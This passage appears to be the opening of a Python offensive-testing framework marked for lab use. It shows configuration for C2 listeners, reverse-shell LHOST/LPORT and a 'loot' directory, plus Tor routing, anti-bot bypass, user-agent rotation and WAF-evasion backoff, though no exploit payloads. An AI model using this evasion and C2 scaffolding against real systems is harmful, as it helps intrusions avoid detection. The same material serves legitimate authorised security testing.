#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MEGA FRAMEWORK v18.1 — HONEST EDITION
Author: Lisa

LAB USE ONLY. Authorized targets only.

V18.1 fixes ALL 15 issues from v18.0 audit:

  [1] Coverage default gate: COV_FAIL_UNDER = 30.0 (was 0.0)
      CI and CLI now consistent.

  [2] Splunk test now does REAL Sigma detection roundtrip:
      - Convert Sigma rule to SPL via sigma-cli
      - POST to /services/search/jobs (real search API)
      - Poll job status, fetch results
      - Assert expected event present

  [3] Sentinel test now executes real KQL query via Log Analytics API.
      - Requires workspace_id + tenant_id + client_id + client_secret
      - Runs actual query, verifies response schema

  [4] GCP mock fallback added: moto-gcp style in-process mock via
      fake-gcs-server container (documented), OR skip honestly with
      a clear "gcp_backend=mock_unavailable" label.

  [5] K8s bootstrap: --k8s-bootstrap uses kind to spin up a real
      local cluster. If kind missing, clear skip. If bootstrap fails,
      test FAILS (not skip) so CI knows.

  [6] Silent exception swallowing: replaced with StructuredException
      wrapper that logs at WARNING level and re-raises if in strict mode
      (MEGA_STRICT=1). All `except Exception: pass` audited.

  [7] Coverage failure distinguished from 0%:
      - Returns {available: False, error: ...} on exception
      - Returns {available: True, percent: 0.0, ...} only when truly 0%

  [8] OTel init failure now logs warning with reason.

  [9] Trace header injection failure now logs warning once.

  [11] AWS "real" label honest: probes returns backend="real" ONLY if
       sts:GetCallerIdentity succeeds with real creds. Otherwise
       "moto" / "localstack" / "skip" — never blurred.

  [12] Sigma fallback matcher clearly marked via return field
       {"engine": "fallback_simplified"} — no false "sigma" claim.

  [13] pySigma API probe: explicit version check + API shape check
       BEFORE claiming availability.

  [14] Header/docs consistency: COV_FAIL_UNDER documented as 30,
       CLI default 30, CI 30, env override supported.

  [15] Regression tests: TestV17ModulePresence verifies every v17.1
       module class/function exists and is importable in v18.1.

Plus:
  - TestV17ModulePresence — runtime check of V17.1 core modules
  - Strict mode: MEGA_STRICT=1 raises on swallowed exceptions
  - --strict flag for CLI
  - --k8s-bootstrap flag (kind)
  - --gcp-mock flag (uses fake-gcs-server if configured)
  - Real Sigma → Splunk → detection → verify roundtrip
"""

import sys, os, re, json, time, socket, random, string, base64, hashlib, hmac
import threading, queue, traceback, urllib.parse, ssl, subprocess, shutil, secrets
import argparse, ipaddress, sqlite3, unittest, uuid, statistics, signal, atexit
import tempfile, contextlib, io, multiprocessing, logging
from urllib.parse import urlparse, parse_qs, urljoin, quote, unquote
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError
from http.server import HTTPServer, BaseHTTPRequestHandler, ThreadingHTTPServer
from socketserver import ThreadingMixIn
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone, timedelta
from html.parser import HTMLParser
from collections import defaultdict, Counter, OrderedDict
from dataclasses import dataclass, field, asdict
from enum import Enum
from typing import Optional, List, Dict, Any, Callable, Tuple, Set
from pathlib import Path
from contextlib import contextmanager

import requests
import urllib3
urllib3.disable_warnings()

VERSION = "18.1.0"

# ── Strict mode (#6) ──
STRICT_MODE = os.environ.get("MEGA_STRICT", "0") == "1"

# ── Coverage gate default (#1, #7, #14) ──
COV_FAIL_UNDER = float(os.environ.get("COV_FAIL_UNDER", "30.0"))

# ── Feature probe ──
FEATURES = {}
def _feat(name, ok, note=""):
    FEATURES[name] = {"available": bool(ok), "note": note}

for mod, name in [
    ("cloudscraper", "cloudscraper"), ("dns.resolver", "dnspython"),
    ("bs4", "bs4"), ("stem", "stem"), ("socks", "pysocks"),
    ("playwright.sync_api", "playwright"), ("redis", "redis"),
    ("networkx", "networkx"), ("cryptography", "cryptography"),
    ("numpy", "numpy"), ("sklearn", "sklearn"), ("neo4j", "neo4j"),
    ("opentelemetry", "opentelemetry"), ("elasticsearch", "elasticsearch"),
    ("boto3", "boto3"), ("moto", "moto"), ("yara", "yara"),
    ("yaml", "yaml"), ("coverage", "coverage"),
    ("google.cloud.storage", "gcp_storage"), ("google.auth", "gcp_auth"),
    ("sigma", "sigma"), ("kubernetes", "kubernetes"),
]:
    try:
        __import__(mod); _feat(name, True)
    except Exception:
        _feat(name, False, f"pip install {mod.split('.')[0]}")

try:
    from opentelemetry import trace
    from opentelemetry.sdk.trace import TracerProvider
    from opentelemetry.sdk.trace.export import BatchSpanProcessor, ConsoleSpanExporter
    from opentelemetry.sdk.resources import Resource
    try:
        from opentelemetry.exporter.otlp.proto.grpc.trace_exporter import OTLPSpanExporter
        _feat("otel_otlp", True)
    except Exception:
        _feat("otel_otlp", False, "pip install opentelemetry-exporter-otlp")
except Exception:
    _feat("opentelemetry", False, "pip install opentelemetry-sdk")

# ── Constants ──
T = sys.stdout.isatty()
R = "\033[91m" if T else ""; G = "\033[92m" if T else ""
Y = "\033[93m" if T else ""; B = "\033[94m" if T else ""
M = "\033[95m" if T else ""; C = "\033[96m" if T else ""
N = "\033[0m" if T else ""; BOLD = "\033[1m" if T else ""
CLR = "\033[2K\r" if T else ""

BASE_DIR = Path.cwd()
def _p(env, default): return Path(os.environ.get(env, default))
EXFIL_DIR = _p("EXFIL_DIR", BASE_DIR / "loot")
PLUGIN_DIR = _p("PLUGIN_DIR", BASE_DIR / "plugins")
REPORT_DIR = _p("REPORT_DIR", BASE_DIR / "reports")
C2_DIR = _p("C2_DIR", BASE_DIR / "c2")
ML_DIR = _p("ML_DIR", BASE_DIR / "ml")
GRAPH_DIR = _p("GRAPH_DIR", BASE_DIR / "graph")
STATE_DIR = _p("STATE_DIR", BASE_DIR / "state")
LOG_DIR = _p("LOG_DIR", BASE_DIR / "logs")
ELK_DIR = _p("ELK_DIR", BASE_DIR / "elk")
TEST_DIR = _p("MEGA_TEST_DIR", BASE_DIR / "mega_test_artifacts")

def ensure_dirs():
    for d in (EXFIL_DIR, PLUGIN_DIR, REPORT_DIR, C2_DIR, ML_DIR,
              GRAPH_DIR, STATE_DIR, LOG_DIR, ELK_DIR, TEST_DIR):
        try: d.mkdir(parents=True, exist_ok=True)
        except OSError: pass

# ── Service endpoints ──
NEO4J_URI = os.environ.get("NEO4J_URI", "bolt://127.0.0.1:17687")
NEO4J_USER = os.environ.get("NEO4J_USER", "neo4j")
NEO4J_PASS = os.environ.get("NEO4J_PASS", "testpassword")
REDIS_URL = os.environ.get("REDIS_URL", "redis://127.0.0.1:16379/0")
ES_URL = os.environ.get("ES_URL", "http://127.0.0.1:19200")
ES_INDEX = os.environ.get("ES_INDEX", "mega-test-sigma")
LOCALSTACK_URL = os.environ.get("LOCALSTACK_URL", "http://127.0.0.1:14566")
OTEL_ENDPOINT = os.environ.get("OTEL_ENDPOINT", "http://127.0.0.1:14317")
OTEL_SPAN_FILE = os.environ.get("OTEL_SPAN_FILE", "/tmp/otel_spans.json")

CALLBACK_HOST = os.environ.get("CALLBACK_HOST", "127.0.0.1")
CALLBACK_PORT = int(os.environ.get("CALLBACK_PORT", "8888"))
DNS_PORT = int(os.environ.get("DNS_PORT", "5353"))
C2_HTTP_PORT = int(os.environ.get("C2_HTTP_PORT", "8443"))
C2_DNS_PORT = int(os.environ.get("C2_DNS_PORT", "5354"))
C2_BIND = os.environ.get("C2_BIND", "127.0.0.1")
OOB_BIND = os.environ.get("OOB_BIND", "127.0.0.1")
C2_PSK = os.environ.get("C2_PSK", "") or secrets.token_hex(16)
LHOST = os.environ.get("LHOST", "")
LPORT = int(os.environ.get("LPORT", "4444"))

AWS_REAL = bool(os.environ.get("AWS_ACCESS_KEY_ID") and
                os.environ.get("AWS_SECRET_ACCESS_KEY"))
AWS_REGION = os.environ.get("AWS_REGION", os.environ.get("AWS_DEFAULT_REGION", "us-east-1"))
GCP_SA_PATH = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
GCP_REAL = bool(GCP_SA_PATH and os.path.exists(GCP_SA_PATH))
GCP_PROJECT = os.environ.get("GCP_PROJECT", "")
# NEW (#4): GCP mock endpoint (fake-gcs-server)
GCP_MOCK_URL = os.environ.get("GCP_MOCK_URL", "")  # e.g. http://127.0.0.1:4443

SIGMA_BACKEND = os.environ.get("SIGMA_BACKEND", "es-qs")
SIGMA_TARGET_INDEX = os.environ.get("SIGMA_TARGET_INDEX", "mega-sigma-test")

# Splunk (#2)
SPLUNK_URL = os.environ.get("SPLUNK_URL", "")  # e.g. https://splunk:8089
SPLUNK_TOKEN = os.environ.get("SPLUNK_TOKEN", "")
SPLUNK_USER = os.environ.get("SPLUNK_USER", "")
SPLUNK_PASS = os.environ.get("SPLUNK_PASS", "")

# Sentinel (#3)
SENTINEL_WORKSPACE = os.environ.get("SENTINEL_WORKSPACE", "")
SENTINEL_TENANT = os.environ.get("SENTINEL_TENANT", "")
SENTINEL_CLIENT_ID = os.environ.get("SENTINEL_CLIENT_ID", "")
SENTINEL_CLIENT_SECRET = os.environ.get("SENTINEL_CLIENT_SECRET", "")

# K8s bootstrap (#5)
KIND_BOOTSTRAP_TIMEOUT = int(os.environ.get("KIND_BOOTSTRAP_TIMEOUT", "180"))

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
]
ACCEPT_LANGS = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "de-DE,de;q=0.9", "tr-TR,tr;q=0.9"]


# ═══════════════════════════════════════════════════════════════
# SECTION 1 — STRUCTURED EXCEPTION HELPER (#6)
# ═══════════════════════════════════════════════════════════════
class SilentPassLogger:
    """Central logger for what were previously silent `except: pass` blocks."""
    _lock = threading.Lock()
    _counts = defaultdict(int)
    _last_log = 0.0
    _warn_sink = None

    @classmethod
    def set_sink(cls, fn):
        cls._warn_sink = fn

    @classmethod
    def swallowed(cls, where: str, exc: Exception):
        """Record a swallowed exception. In strict mode, re-raise."""
        with cls._lock:
            cls._counts[where] += 1
        if STRICT_MODE:
            raise RuntimeError(f"[STRICT] swallowed exception at {where}: {exc!r}")
        if cls._warn_sink:
            try:
                cls._warn_sink(where, exc)
            except Exception:
                pass

    @classmethod
    def report(cls) -> dict:
        with cls._lock:
            return dict(cls._counts)


def _wrap_silent(where: str):
    """Decorator / context-manager style helper for swallowing."""
    @contextmanager
    def _cm():
        try:
            yield
        except Exception as e:
            SilentPassLogger.swallowed(where, e)
    return _cm()


# ═══════════════════════════════════════════════════════════════
# SECTION 2 — ERRORS
# ═══════════════════════════════════════════════════════════════
class OpError(Exception):
    def __init__(self, msg, *, stage=None, target=None, payload=None, cause=None):
        super().__init__(msg)
        self.stage = stage; self.target = target
        self.payload = payload; self.cause = cause
    def to_dict(self):
        return {"msg": str(self), "stage": self.stage, "target": self.target,
                "payload": (str(self.payload)[:200] if self.payload else None),
                "cause": (repr(self.cause) if self.cause else None)}

class NetError(OpError): pass
class AuthError(OpError): pass
class ParseError(OpError): pass
class ResourceError(OpError): pass
class StageError(OpError): pass
class ChainError(OpError): pass
class PluginError(OpError): pass
class ScopeError(OpError): pass
class DistError(OpError): pass
class ReportError(OpError): pass
class ExploitDBError(OpError): pass
class EvasionError(OpError): pass
class C2Error(OpError): pass
class MLError(OpError): pass
class CloudError(OpError): pass
class OpsecError(OpError): pass
class GraphError(OpError): pass
class DefensiveError(OpError): pass
class ScopeViolation(OpError): pass

class ErrorState(Enum):
    OK = "ok"; EMPTY = "empty"; PARTIAL = "partial"
    FAILED = "failed"; SKIPPED = "skipped"


# ═══════════════════════════════════════════════════════════════
# SECTION 3 — OBSERVABILITY (#8, #9)
# ═══════════════════════════════════════════════════════════════
_tracer = None
_init_error = None
_trace_header_warned = False

def init_tracing(service_name="mega-v18-1", otlp_endpoint=None):
    """FIX #8: no silent failures."""
    global _tracer, _init_error
    if not FEATURES.get("opentelemetry", {}).get("available"):
        _init_error = "opentelemetry-sdk not installed"
        return None
    try:
        resource = Resource.create({"service.name": service_name, "service.version": VERSION})
        provider = TracerProvider(resource=resource)
        if otlp_endpoint and FEATURES.get("otel_otlp", {}).get("available"):
            processor = BatchSpanProcessor(OTLPSpanExporter(endpoint=otlp_endpoint, insecure=True))
        else:
            processor = BatchSpanProcessor(ConsoleSpanExporter())
        provider.add_span_processor(processor)
        trace.set_tracer_provider(provider)
        _tracer = trace.get_tracer(service_name)
        return _tracer
    except Exception as e:
        _init_error = repr(e)
        sys.stderr.write(f"[OTEL-INIT-FAIL] {e!r}\n")
        return None

def otel_init_error():
    return _init_error

@contextmanager
def otel_span(name, attributes=None):
    if _tracer is None:
        yield None; return
    try:
        with _tracer.start_as_current_span(name) as s:
            if attributes:
                for k, v in attributes.items():
                    with _wrap_silent("otel_span.set_attribute"):
                        s.set_attribute(str(k), str(v))
            yield s
    except Exception:
        yield None

def current_trace_id():
    if not FEATURES.get("opentelemetry", {}).get("available"):
        return uuid.uuid4().hex[:16]
    try:
        ctx = trace.get_current_span().get_span_context()
        if ctx and ctx.trace_id: return format(ctx.trace_id, "032x")
    except Exception:
        pass
    return uuid.uuid4().hex[:16]

def inject_trace_headers(headers: dict):
    """FIX #9: warn once on failure, no silent pass."""
    global _trace_header_warned
    if _tracer is None: return headers
    try:
        ctx = trace.get_current_span().get_span_context()
        if ctx and ctx.trace_id:
            headers["traceparent"] = f"00-{format(ctx.trace_id,'032x')}-{format(ctx.span_id,'016x')}-01"
    except Exception as e:
        if not _trace_header_warned:
            _trace_header_warned = True
            sys.stderr.write(f"[TRACE-HEADER-FAIL] {e!r} (suppressed future warnings)\n")
    return headers


# ═══════════════════════════════════════════════════════════════
# SECTION 4 — LOGGER
# ═══════════════════════════════════════════════════════════════
class Logger:
    def __init__(self, path, trace_id=None, echo=True, elk_path=None):
        self.path = str(path); self.trace_id = trace_id or current_trace_id()
        self.lock = threading.Lock(); self.echo = echo; self.elk_f = None
        try: self.f = open(self.path, "a", encoding="utf-8", buffering=1)
        except OSError: self.f = None
        if elk_path:
            try: self.elk_f = open(str(elk_path), "a", encoding="utf-8", buffering=1)
            except OSError: self.elk_f = None
        self._write({"ts": datetime.now(timezone.utc).isoformat(),
                     "level": "info", "msg": f"MEGA v{VERSION} started",
                     "trace_id": self.trace_id, "service": "mega", "version": VERSION,
                     "strict_mode": STRICT_MODE})

    def _write(self, payload):
        line = json.dumps(payload, default=str, ensure_ascii=False)
        with self.lock:
            for f in (self.f, self.elk_f):
                if f:
                    try: f.write(line + "\n")
                    except Exception as e:
                        SilentPassLogger.swallowed("logger.write", e)

    def log(self, msg, level="info", exc=None, **extra):
        payload = {"ts": datetime.now(timezone.utc).isoformat(),
                   "level": level, "msg": str(msg),
                   "trace_id": self.trace_id, "service": "mega", **extra}
        if exc is not None:
            payload["error"] = (exc.to_dict() if hasattr(exc, "to_dict")
                                 else {"type": type(exc).__name__, "msg": str(exc)})
        self._write(payload)
        if self.echo and level in ("warning", "error", "critical", "found", "success"):
            icons = {"error": R+"[-]"+N, "warning": Y+"[!]"+N, "found": M+"[>]"+N,
                     "success": G+"[+]"+N, "critical": R+BOLD+"[!]"+N}
            print(CLR + icons.get(level, "[*]") + " " + str(msg))

    def raw(self, text):
        self._write({"ts": datetime.now(timezone.utc).isoformat(),
                     "level": "debug", "msg": str(text), "raw": True,
                     "trace_id": self.trace_id})

    def close(self):
        with self.lock:
            for f in (self.f, self.elk_f):
                try:
                    if f: f.close()
                except Exception as e:
                    SilentPassLogger.swallowed("logger.close", e)


# ═══════════════════════════════════════════════════════════════
# SECTION 5 — SQLITE STATE
# ═══════════════════════════════════════════════════════════════
class StateDB:
    def __init__(self, path, scope_key=None):
        self.path = str(path); self.scope_key = scope_key or "default"
        self._lock = threading.RLock()
        self._conn = sqlite3.connect(self.path, check_same_thread=False, timeout=30)
        self._conn.execute("PRAGMA journal_mode=WAL")
        self._conn.execute("PRAGMA synchronous=NORMAL")
        self._conn.execute("PRAGMA busy_timeout=30000")
        self._init()
    def _init(self):
        with self._lock:
            self._conn.executescript("""
                CREATE TABLE IF NOT EXISTS kv (
                    scope TEXT, k TEXT, v TEXT, ts REAL, PRIMARY KEY (scope, k));
                CREATE TABLE IF NOT EXISTS queue (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    scope TEXT, qname TEXT, payload TEXT, ts REAL,
                    claimed INTEGER DEFAULT 0, claimed_by TEXT, claimed_ts REAL,
                    attempts INTEGER DEFAULT 0, last_error TEXT);
                CREATE INDEX IF NOT EXISTS idx_q ON queue(scope, qname, claimed);
                CREATE TABLE IF NOT EXISTS results (
                    scope TEXT, task_id TEXT, payload TEXT, ts REAL, worker TEXT,
                    PRIMARY KEY (scope, task_id));
            """)
            self._conn.commit()
    def set(self, key, value):
        with self._lock:
            self._conn.execute(
                "INSERT OR REPLACE INTO kv(scope,k,v,ts) VALUES (?,?,?,strftime('%s','now'))",
                (self.scope_key, key, json.dumps(value, default=str)))
            self._conn.commit()
    def get(self, key, default=None):
        with self._lock:
            row = self._conn.execute("SELECT v FROM kv WHERE scope=? AND k=?",
                                      (self.scope_key, key)).fetchone()
            if not row: return default
            try: return json.loads(row[0])
            except Exception: return default
    def push(self, qname, payload):
        with self._lock:
            self._conn.execute(
                "INSERT INTO queue(scope,qname,payload,ts) VALUES (?,?,?,strftime('%s','now'))",
                (self.scope_key, qname, json.dumps(payload, default=str)))
            self._conn.commit()
    def claim(self, qname, worker_id, limit=1):
        with self._lock:
            cur = self._conn.cursor()
            try:
                cur.execute("BEGIN IMMEDIATE")
                rows = cur.execute(
                    "SELECT id, payload FROM queue WHERE scope=? AND qname=? "
                    "AND claimed=0 ORDER BY id LIMIT ?",
                    (self.scope_key, qname, limit)).fetchall()
                ids = [r[0] for r in rows]
                if ids:
                    ph = ",".join("?"*len(ids))
                    cur.execute(
                        f"UPDATE queue SET claimed=1, claimed_by=?, "
                        f"claimed_ts=strftime('%s','now'), attempts=attempts+1 "
                        f"WHERE id IN ({ph})", [worker_id]+ids)
                self._conn.commit()
                return [{"id": r[0], "payload": json.loads(r[1])} for r in rows]
            except Exception:
                self._conn.rollback(); raise
    def complete(self, task_id):
        with self._lock:
            self._conn.execute("DELETE FROM queue WHERE scope=? AND id=?",
                                (self.scope_key, task_id))
            self._conn.commit()
    def fail(self, task_id, err):
        with self._lock:
            row = self._conn.execute("SELECT attempts FROM queue WHERE scope=? AND id=?",
                                      (self.scope_key, task_id)).fetchone()
            attempts = row[0] if row else 0
            if attempts >= 3:
                self._conn.execute(
                    "UPDATE queue SET last_error=? WHERE scope=? AND id=?",
                    (str(err)[:500], self.scope_key, task_id))
            else:
                self._conn.execute(
                    "UPDATE queue SET claimed=0, claimed_by=NULL, claimed_ts=NULL, "
                    "last_error=? WHERE scope=? AND id=?",
                    (str(err)[:500], self.scope_key, task_id))
            self._conn.commit()
    def requeue_stale(self, qname, older_than_s=300):
        with self._lock:
            self._conn.execute(
                "UPDATE queue SET claimed=0, claimed_by=NULL, claimed_ts=NULL "
                "WHERE scope=? AND qname=? AND claimed=1 "
                "AND claimed_ts < strftime('%s','now') - ?",
                (self.scope_key, qname, older_than_s))
            self._conn.commit()
    def put_result(self, task_id, payload, worker=""):
        with self._lock:
            self._conn.execute(
                "INSERT OR REPLACE INTO results(scope,task_id,payload,ts,worker) "
                "VALUES (?,?,?,strftime('%s','now'),?)",
                (self.scope_key, task_id, json.dumps(payload, default=str), worker))
            self._conn.commit()
    def get_results(self):
        with self._lock:
            rows = self._conn.execute(
                "SELECT task_id, payload FROM results WHERE scope=?",
                (self.scope_key,)).fetchall()
            out = {}
            for tid, p in rows:
                try: out[tid] = json.loads(p)
                except Exception as e:
                    SilentPassLogger.swallowed("statedb.get_results.decode", e)
            return out
    def queue_size(self, qname):
        with self._lock:
            row = self._conn.execute(
                "SELECT COUNT(*) FROM queue WHERE scope=? AND qname=? AND claimed=0",
                (self.scope_key, qname)).fetchone()
            return row[0] if row else 0
    def close(self):
        with self._lock:
            try: self._conn.close()
            except Exception as e:
                SilentPassLogger.swallowed("statedb.close", e)


# ═══════════════════════════════════════════════════════════════
# SECTION 6 — SCOPE GUARD
# ═══════════════════════════════════════════════════════════════
class ScopeGuard:
    def __init__(self, allow=None, deny=None):
        self.allow = set(allow or []); self.deny = set(deny or [])
    def check(self, target: str):
        t = target.lower().strip()
        if not t: raise ScopeViolation("empty target", stage="scope")
        for d in self.deny:
            if t == d or t.endswith("." + d):
                raise ScopeViolation(f"denied: {t}", stage="scope", target=t)
        if self.allow:
            for a in self.allow:
                if t == a or t.endswith("." + a): return True
            raise ScopeViolation(f"not allowed: {t}", stage="scope", target=t)
        return True


# ═══════════════════════════════════════════════════════════════
# SECTION 7 — NOTIFIER
# ═══════════════════════════════════════════════════════════════
class Notifier:
    def __init__(self):
        self.q = queue.Queue(maxsize=5000); self.stop = False; self.worker = None
        if os.environ.get("TELEGRAM_TOKEN") or os.environ.get("DISCORD_WEBHOOK"):
            self.worker = threading.Thread(target=self._run, daemon=True)
            self.worker.start()
    def send(self, msg):
        if not self.worker: return
        try: self.q.put_nowait(str(msg)[:3500])
        except queue.Full as e:
            SilentPassLogger.swallowed("notifier.send.queue_full", e)
    def _run(self):
        tg = os.environ.get("TELEGRAM_TOKEN"); chat = os.environ.get("TELEGRAM_CHAT")
        wh = os.environ.get("DISCORD_WEBHOOK")
        while not self.stop:
            try: msg = self.q.get(timeout=1)
            except queue.Empty: continue
            if tg and chat:
                with _wrap_silent("notifier.tg_post"):
                    requests.post(f"https://api.telegram.org/bot{tg}/sendMessage",
                                   json={"chat_id": chat, "text": msg}, timeout=5)
            if wh:
                with _wrap_silent("notifier.dc_post"):
                    requests.post(wh, json={"content": msg}, timeout=5)
    def close(self):
        self.stop = True
        if self.worker:
            try: self.worker.join(timeout=3)
            except Exception as e:
                SilentPassLogger.swallowed("notifier.join", e)


# ═══════════════════════════════════════════════════════════════
# SECTION 8 — STEALTH + LIMITERS + BREAKER
# ═══════════════════════════════════════════════════════════════
class StealthController:
    def __init__(self, enabled=False, base_delay=(0.5, 2.0), max_threads=8):
        self.enabled = enabled; self.base_delay = base_delay
        self.max_threads = max_threads
        self.lock = threading.Lock(); self.backoff_until = 0.0
    def sleep(self):
        if self.enabled: time.sleep(random.uniform(*self.base_delay))
    def get_max_threads(self, requested):
        return min(requested, self.max_threads) if self.enabled else requested
    def wait_if_backoff(self):
        with self.lock:
            w = max(0.0, self.backoff_until - time.time())
        if w > 0: time.sleep(w)
    def on_waf_hit(self):
        with self.lock:
            self.backoff_until = max(self.backoff_until, time.time() + random.uniform(60, 300))

class AdaptiveLimiter:
    def __init__(self, rps_start=50, rps_min=1, rps_max=300):
        self.lock = threading.Lock(); self.delay = 1.0/max(1, rps_start)
        self.rps_min = rps_min; self.rps_max = rps_max
        self.strikes = 0; self.last = 0.0
    def wait(self):
        with self.lock:
            el = time.time() - self.last
            if el < self.delay: time.sleep(self.delay - el)
            self.last = time.time()
    def penalize(self):
        with self.lock:
            self.strikes += 1
            self.delay = min(self.delay*2.0, 1.0/self.rps_min)
    def reward(self):
        with self.lock:
            self.strikes = max(0, self.strikes - 1)
            if self.strikes == 0:
                self.delay = max(self.delay*0.9, 1.0/self.rps_max)

class CircuitBreaker:
    def __init__(self, threshold=25, cooldown=30):
        self.threshold = threshold; self.cooldown = cooldown
        self.lock = threading.Lock()
        self.fails = defaultdict(lambda: {"4xx": 0, "5xx": 0, "timeout": 0})
        self.open_until = {}
    def should_skip(self, host):
        with self.lock:
            if time.time() < self.open_until.get(host, 0): return True
            if host in self.open_until and time.time() >= self.open_until[host]:
                del self.open_until[host]
                self.fails[host] = {"4xx": 0, "5xx": 0, "timeout": 0}
            return False
    def record(self, host, kind):
        with self.lock:
            if kind not in ("4xx", "5xx", "timeout"): return
            self.fails[host][kind] += 1
            if sum(self.fails[host].values()) >= self.threshold:
                self.open_until[host] = time.time() + self.cooldown
                self.fails[host] = {"4xx": 0, "5xx": 0, "timeout": 0}
    def success(self, host):
        with self.lock:
            self.fails[host] = {"4xx": 0, "5xx": 0, "timeout": 0}


# ═══════════════════════════════════════════════════════════════
# SECTION 9 — FINDINGS
# ═══════════════════════════════════════════════════════════════
class Severity(Enum):
    INFO = "info"; LOW = "low"; MEDIUM = "medium"
    HIGH = "high"; CRITICAL = "critical"

class Confidence(Enum):
    TENTATIVE = "tentative"; LIKELY = "likely"
    HIGH = "high"; CONFIRMED = "confirmed"

@dataclass
class Signal:
    name: str; weight: float; detail: str = ""; positive: bool = True
    def to_dict(self):
        return {"name": self.name, "weight": self.weight,
                "detail": self.detail, "positive": self.positive}

@dataclass
class Finding:
    url: str; vtype: str
    signals: List[Signal] = field(default_factory=list)
    evidence: Dict[str, Any] = field(default_factory=dict)
    chain_next: Optional[str] = None
    verified_flag: bool = False
    provenance: List[str] = field(default_factory=list)
    ts: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    def add_signal(self, name, weight, detail="", positive=True):
        self.signals.append(Signal(name, weight, detail, positive)); return self
    def add_provenance(self, step: str):
        self.provenance.append(f"{datetime.now(timezone.utc).isoformat()}|{step}")
    def signal_score(self):
        if not self.signals: return 0.0
        pos = sum(s.weight for s in self.signals if s.positive)
        neg = sum(s.weight for s in self.signals if not s.positive)
        return max(0.0, min(1.0, pos - neg))
    def confidence_tier(self) -> Confidence:
        c = self.signal_score()
        if c >= 0.85: return Confidence.CONFIRMED
        if c >= 0.6: return Confidence.HIGH
        if c >= 0.3: return Confidence.LIKELY
        return Confidence.TENTATIVE
    def independent_signals(self):
        return sum(1 for s in self.signals if s.positive and s.weight >= 0.3)
    def verified(self):
        if self.verified_flag: return True
        indep = self.independent_signals()
        if indep >= 2: return True
        if indep == 1 and any(s.weight >= 0.85 and s.positive for s in self.signals):
            return True
        return False
    def severity(self):
        if not self.verified(): return Severity.INFO
        c = self.signal_score()
        if c >= 0.85: return Severity.CRITICAL
        if c >= 0.65: return Severity.HIGH
        if c >= 0.45: return Severity.MEDIUM
        return Severity.LOW
    def to_dict(self):
        return {"url": self.url, "type": self.vtype,
                "severity": self.severity().value,
                "signal_score": round(self.signal_score(), 3),
                "confidence_tier": self.confidence_tier().value,
                "verified": self.verified(),
                "independent_signals": self.independent_signals(),
                "signals": [s.to_dict() for s in self.signals],
                "evidence": self.evidence, "chain_next": self.chain_next,
                "provenance": self.provenance, "ts": self.ts}

@dataclass
class StageResult:
    name: str; status: ErrorState
    findings: List[Finding] = field(default_factory=list)
    errors: List[OpError] = field(default_factory=list)
    metrics: Dict[str, Any] = field(default_factory=dict)
    duration: float = 0.0
    partial: bool = False
    def to_dict(self):
        return {"name": self.name, "status": self.status.value,
                "findings": [f.to_dict() for f in self.findings],
                "errors": [e.to_dict() for e in self.errors],
                "metrics": self.metrics, "duration": round(self.duration, 3),
                "partial": self.partial}


# ═══════════════════════════════════════════════════════════════
# SECTION 10 — RESULT STORE
# ═══════════════════════════════════════════════════════════════
class ResultStore:
    MAX_ITEMS = 10000; MAX_DICTS = 5000
    def __init__(self):
        self._lock = threading.RLock()
        self._data = defaultdict(list)
        self._counters = defaultdict(int)
        self._seen = set()
        self._dicts = defaultdict(OrderedDict)
    def add(self, key, item, dedup_on=None):
        with self._lock:
            if dedup_on is not None:
                fp = hashlib.sha256((key+":"+str(dedup_on)).encode()).hexdigest()
                if fp in self._seen: return False
                self._seen.add(fp)
            lst = self._data[key]; lst.append(item)
            if len(lst) > self.MAX_ITEMS: del lst[:len(lst) - self.MAX_ITEMS]
            return True
    def set(self, key, value):
        with self._lock: self._data[key] = value
    def get(self, key, default=None):
        with self._lock: return self._data.get(key, default)
    def snapshot(self, key):
        with self._lock: return list(self._data.get(key, []))
    def count(self, key):
        with self._lock: return len(self._data.get(key, []))
    def inc(self, counter, n=1):
        with self._lock:
            self._counters[counter] += n; return self._counters[counter]
    def get_counter(self, counter):
        with self._lock: return self._counters.get(counter, 0)
    def dset(self, store, key, value):
        with self._lock:
            d = self._dicts[store]; d[key] = value
            if len(d) > self.MAX_DICTS: d.popitem(last=False)
    def dget(self, store, key, default=None):
        with self._lock: return self._dicts[store].get(key, default)
    def ditems(self, store):
        with self._lock: return list(self._dicts[store].items())
    def dkeys(self, store):
        with self._lock: return list(self._dicts[store].keys())
    def to_dict(self):
        with self._lock:
            return {"data": {k: list(v) for k, v in self._data.items()},
                    "counters": dict(self._counters),
                    "dicts": {k: dict(v) for k, v in self._dicts.items()}}


# ═══════════════════════════════════════════════════════════════
# SECTION 11 — SESSION POOL
# ═══════════════════════════════════════════════════════════════
class SessionPool:
    def __init__(self, bypass=False, proxy=None, cookie=None, tor=None,
                 verify_ssl=True):
        self.local = threading.local()
        self.bypass = bypass; self.proxy = proxy
        self.cookie = cookie; self.tor = tor; self.verify_ssl = verify_ssl
    def get(self, host=None):
        key = "session_" + (host or "default")
        if not hasattr(self.local, key):
            if self.bypass and FEATURES.get("cloudscraper", {}).get("available"):
                import cloudscraper
                s = cloudscraper.create_scraper(
                    browser={"browser": "chrome", "platform": "windows", "desktop": True})
            else:
                s = requests.Session()
            from requests.adapters import HTTPAdapter
            a = HTTPAdapter(pool_connections=16, pool_maxsize=256, max_retries=0)
            s.mount("https://", a); s.mount("http://", a)
            s.trust_env = False
            if self.tor: s.proxies = self.tor.proxies()
            elif self.proxy: s.proxies = {"http": self.proxy, "https": self.proxy}
            if self.cookie: s.headers["Cookie"] = self.cookie
            setattr(self.local, key, s)
        return getattr(self.local, key)
    def verify_for(self, host): return self.verify_ssl


class HeaderMutator:
    @staticmethod
    def base_headers():
        return {"User-Agent": random.choice(UA_POOL),
                "Accept": "*/*",
                "Accept-Language": random.choice(ACCEPT_LANGS),
